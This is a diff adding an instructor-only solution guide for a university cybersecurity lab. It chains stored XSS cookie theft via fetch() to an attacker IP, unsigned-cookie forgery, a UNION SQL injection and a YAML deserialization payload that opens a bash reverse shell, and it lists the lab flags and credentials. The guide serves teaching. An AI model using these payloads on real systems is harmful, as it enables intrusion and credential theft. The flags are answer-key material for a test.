@@ -5,7 +5,6 @@
 \usepackage{float}
 \usepackage[english]{babel}
 \usepackage{geometry}
-\usepackage{setspace}
 \usepackage{titlesec}
 \usepackage{hyperref}
 \usepackage{tabularx}
@@ -55,13 +54,203 @@
 \titleformat{\subsection}{\normalsize\bfseries}{}{0em}{}
 
 \lstset{
-  basicstyle=\small\ttfamily\color{termfg},
-  backgroundcolor=\color{termbg},
+  basicstyle=\small\ttfamily,
+  backgroundcolor=\color{labgray},
   frame=single,
   framesep=4pt,
-  rulecolor=\color{termbg},
   breaklines=true,
   breakatwhitespace=false,
   keepspaces=true,
-  columns=fullflexible,
 }
+
+\begin{document}
+
+% ---- Cover ------------------------------------------------------------------
+\begin{titlepage}
+\centering
+\includegraphics[width=0.6\linewidth]{../../../../docs/images/logo-tecnocampus.png}
+\vspace{1.5cm}
+{\small Bachelor in Computer Engineering -- Management and Information Systems}\\[0.5cm]
+{\small Introduction to Cybersecurity}
+\vspace{3cm}
+
+{\LARGE\bfseries Lab 2 -- Solution Guide}\\[0.4cm]
+{\Large\bfseries Web Application Vulnerabilities (SYNAPSE)}
+
+\vspace{1cm}
+{\large\color{labred}\bfseries INSTRUCTOR ONLY --- DO NOT DISTRIBUTE}
+
+\vspace{4cm}
+\begin{tabular}{ll}
+\textbf{Flags}          & 3 \\
+\textbf{Vulnerabilities}& XSS, Broken Auth, SQLi, BAC, YAML Deserialization \\
+\textbf{OWASP}          & A01, A03, A07, A08 \\
+\end{tabular}
+
+\vfill
+{\small TecnoCampus \textperiodcentered{} GEISI \textperiodcentered{} 2025--2026}
+\end{titlepage}
+
+% ---- Prerequisites ----------------------------------------------------------
+\section{Prerequisites}
+
+\begin{itemize}[leftmargin=1.5em]
+  \item Parrot attacker node running with static IP \texttt{10.0.40.5/24}
+  \item Server-A SYNAPSE Portal running: \texttt{http://192.168.30.10}
+  \item Server-B DataVault running: \texttt{http://192.168.30.20}
+\end{itemize}
+
+Configure Parrot static IP at session start:
+
+\begin{lstlisting}[language=bash]
+nmcli con mod "Wired connection 1" \
+  ipv4.method manual ipv4.addresses 10.0.40.5/24 \
+  ipv4.gateway 10.0.40.1 ipv4.dns 10.0.40.1
+nmcli con up "Wired connection 1"
+\end{lstlisting}
+
+% ---- Phase 1 ----------------------------------------------------------------
+\section{Phase 1 --- Stored XSS + Cookie Theft}
+
+The \texttt{/comments} endpoint renders input without sanitisation
+(\texttt{\{\{ c.body | safe \}\}}).
+The victim bot visits \texttt{/comments} every $\sim$20\,s as user \texttt{guest}.
+The session cookie has no \texttt{HttpOnly} flag.
+
+\subsection*{Step 1 --- Start HTTP listener on Parrot}
+\begin{lstlisting}[language=bash]
+python3 -m http.server 8000
+\end{lstlisting}
+
+\subsection*{Step 2 --- Post XSS payload}
+Login as \texttt{guest / guest123} and post to \texttt{/comments}:
+\begin{lstlisting}[language=html]
+<script>fetch('http://10.0.40.5:8000/?c='
+  +encodeURIComponent(document.cookie))</script>
+\end{lstlisting}
+
+\subsection*{Step 3 --- Receive victim cookie}
+Within $\sim$20\,s the listener logs:
+\begin{lstlisting}
+GET /?c=session%3D1%3Aguest%3Aguest HTTP/1.1
+\end{lstlisting}
+
+Cookie format exposed: \texttt{ID:ROLE:USERNAME} --- no cryptographic signature.
+
+% ---- Phase 2 ----------------------------------------------------------------
+\section{Phase 2 --- Broken Authentication (Cookie Forgery)}
+
+\begin{lstlisting}[language=javascript]
+document.cookie = "session=1:admin:admin; path=/"
+\end{lstlisting}
+
+Refresh any page --- header shows \texttt{Logged in as: admin}. Access to
+\texttt{/portal} and \texttt{/search} is now granted.
+
+% ---- Phase 3 ----------------------------------------------------------------
+\section{Phase 3 --- UNION SQL Injection (FLAG \#1)}
+
+The \texttt{/search?q=} endpoint concatenates user input into a raw SQL query.
+
+\subsection*{Step 1 --- Confirm injection}
+\begin{lstlisting}
+http://192.168.30.10/search?q='
+\end{lstlisting}
+Error displayed in browser confirms injection. The \texttt{reports} table has 5~columns.
+
+\subsection*{Step 2 --- Dump \texttt{admin\_users}}
+\begin{lstlisting}
+/search?q=' UNION SELECT 1,username,flag,password,5 FROM admin_users--
+\end{lstlisting}
+
+Result:
+\begin{lstlisting}
+monitor
+FLAG{synapse_sqli_creds_dumped}
+\end{lstlisting}
+
+\begin{mdframed}[backgroundcolor=labgray, linecolor=flagcolor, linewidth=1pt]
+\textbf{\color{flagcolor}FLAG \#1:} \texttt{FLAG\{synapse\_sqli\_creds\_dumped\}}
+\end{mdframed}
+
+% ---- Phase 4 ----------------------------------------------------------------
+\section{Phase 4 --- Admin Panel (FLAG \#2)}
+
+With the forged admin cookie, navigate to \texttt{http://192.168.30.10/admin}.
+
+The \texttt{classified\_intel} table entry contains:
+
+\begin{lstlisting}
+FLAG{synapse_admin_classified_accessed}
+operator / D4t4V4ult#2024  [DataVault at 192.168.30.20]
+\end{lstlisting}
+
+\begin{mdframed}[backgroundcolor=labgray, linecolor=flagcolor, linewidth=1pt]
+\textbf{\color{flagcolor}FLAG \#2:} \texttt{FLAG\{synapse\_admin\_classified\_accessed\}}\\
+\textbf{Server-B creds:} \texttt{operator / D4t4V4ult\#2024}
+\end{mdframed}
+
+% ---- Phase 5 ----------------------------------------------------------------
+\section{Phase 5 --- YAML Deserialization \texorpdfstring{$\rightarrow$}{->} RCE (FLAG \#3)}
+
+Server-B DataVault uses \texttt{yaml.UnsafeLoader} in \texttt{/preview/<filename>}.
+
+\subsection*{Step 1 --- Start listener on Parrot}
+\begin{lstlisting}[language=bash]
+nc -lvnp 4444
+\end{lstlisting}
+
+\subsection*{Step 2 --- Create YAML payload}
+\begin{lstlisting}[language=bash]
+cat > exploit.yml << 'EOF'
+!!python/object/apply:os.system
+- "bash -c 'bash -i >& /dev/tcp/10.0.40.5/4444 0>&1'"
+EOF
+\end{lstlisting}
+
+\subsection*{Step 3 --- Upload and trigger}
+\begin{enumerate}[leftmargin=2em]
+  \item Login at \texttt{http://192.168.30.20} as \texttt{operator / D4t4V4ult\#2024}
+  \item Upload \texttt{exploit.yml}
+  \item Click \textbf{Preview} --- reverse shell connects to Parrot
+\end{enumerate}
+
+\subsection*{Step 4 --- Read flag}
+\begin{lstlisting}[language=bash]
+cat /app/data/finalData.txt
+# FLAG{synapse_nexus_exfil_complete}
+\end{lstlisting}
+
+\begin{mdframed}[backgroundcolor=labgray, linecolor=flagcolor, linewidth=1pt]
+\textbf{\color{flagcolor}FLAG \#3:} \texttt{FLAG\{synapse\_nexus\_exfil\_complete\}}\\
+Note: reverse shell runs as \texttt{uid=0(root)} inside the Docker container.
+\end{mdframed}
+
+% ---- Summary ----------------------------------------------------------------
+\section{Summary}
+
+\begin{table}[H]
+\centering
+\begin{tabularx}{\textwidth}{llXl}
+\toprule
+\textbf{Phase} & \textbf{Vulnerability} & \textbf{OWASP} & \textbf{Flag} \\
+\midrule
+1 & Stored XSS + cookie theft     & A03 / A07 & --- \\
+2 & Broken auth (unsigned cookie)  & A07       & --- \\
+3 & UNION SQL Injection            & A03       & FLAG \#1 \\
+4 & Broken access control (admin)  & A01       & FLAG \#2 \\
+5 & YAML deserialization + RCE     & A08       & FLAG \#3 \\
+\bottomrule
+\end{tabularx}
+\end{table}
+
+\subsection*{Key learning points}
+\begin{enumerate}[leftmargin=2em]
+  \item \textbf{Attack chaining} --- no single vulnerability gives the final flag.
+  \item \textbf{Unsigned session tokens} --- any cookie without HMAC/JWT can be forged.
+  \item \textbf{\texttt{yaml.load()} without SafeLoader} --- equivalent to \texttt{eval()};
+        always use \texttt{yaml.safe\_load()}.
+  \item \textbf{Defence in depth} --- each fixed vulnerability still leaves others exploitable.
+\end{enumerate}
+
+\end{document}
